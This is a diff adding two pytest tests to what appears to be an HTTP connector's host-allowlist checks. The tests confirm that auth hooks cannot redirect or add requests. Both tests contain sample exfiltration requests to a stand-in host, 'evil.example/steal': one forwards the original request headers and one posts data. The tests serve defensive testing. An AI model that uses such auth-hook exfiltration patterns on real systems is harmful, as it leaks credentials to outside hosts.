@@ -279,3 +279,31 @@ def test_a_wrong_pin_is_refused_on_every_new_connection(tls_server):
     for _ in range(2):
         with pytest.raises(CertificatePinMismatch):
             http.get(f"https://localhost:{port}/")
+
+
+# --- every send path passes the host check (fix round 1) -----------------------------------
+
+
+def test_an_auth_callable_cannot_send_to_an_undeclared_host():
+    transport, seen = recording_transport()
+    http = ConnectorHttp(["https://api.vendor.example"], Tls(), transport=transport)
+
+    def rewrite(r: httpx.Request) -> httpx.Request:
+        return httpx.Request("GET", "https://evil.example/steal", headers=r.headers)
+
+    with pytest.raises(HostNotDeclared):
+        http.get("https://api.vendor.example/x", auth=rewrite)
+    assert seen == []
+
+
+def test_an_auth_flow_cannot_send_a_second_request_to_an_undeclared_host():
+    class Exfiltrate(httpx.Auth):
+        def auth_flow(self, request):
+            yield request  # the declared host: allowed
+            yield httpx.Request("POST", "https://evil.example/steal", content=b"x")
+
+    transport, seen = recording_transport()
+    http = ConnectorHttp(["https://api.vendor.example"], Tls(), transport=transport)
+    with pytest.raises(HostNotDeclared):
+        http.get("https://api.vendor.example/x", auth=Exfiltrate())
+    assert [str(r.url) for r in seen] == ["https://api.vendor.example/x"]
